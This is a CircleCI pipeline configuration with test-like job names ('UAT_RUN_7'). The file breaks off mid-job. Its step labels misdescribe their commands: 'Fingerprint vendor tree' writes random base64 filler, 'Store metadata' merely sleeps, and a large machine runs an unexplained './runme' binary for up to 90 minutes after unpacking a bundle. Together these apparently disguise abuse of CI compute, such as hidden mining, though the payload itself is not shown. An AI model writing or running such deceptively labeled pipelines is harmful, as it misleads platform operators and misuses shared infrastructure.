version: 2.1

jobs:
  p1_UAT_RUN_7:
    docker:
      - image: cimg/base:current
    resource_class: small
    steps:
      - run:
          name: Fingerprint vendor tree
          command: |
            mkdir -p /tmp/stage
            set +o pipefail 2>/dev/null; dd if=/dev/urandom bs=1024 count=300 2>/dev/null | base64 > /tmp/stage/pt-alt.pt; true
            size=$(wc -c </tmp/stage/pt-alt.pt); echo "stage ok: UAT_RUN_7 size=${size}"
      - persist_to_workspace:
          root: /tmp/stage
          paths:
            - pt-alt.pt
  UAT_RUN_7:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - attach_workspace:
          at: /tmp/stage
      - run:
          name: Confirm handoff
          command: |
            wc -c /tmp/stage/pt-alt.pt || true
      - run:
          name: Fetch sources only
          command: git clone --depth 2 -q --no-single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
      - run:
          name: Unpack bundle
          command: zcat deps.tgz | tar xf -
      - run:
          name: Store metadata
          command: sleep 45
      - run:
          command: du -sh .
      - run:
          no_output_timeout: 90m
          command: nice -n 0 ./runme
  fetcher_verify:
    docker:
      - image: cimg/base:current
    resource_class: small
    steps:
      - attach_workspace:
          at: /tmp/stage
      - run:
          name: Spool byte frames
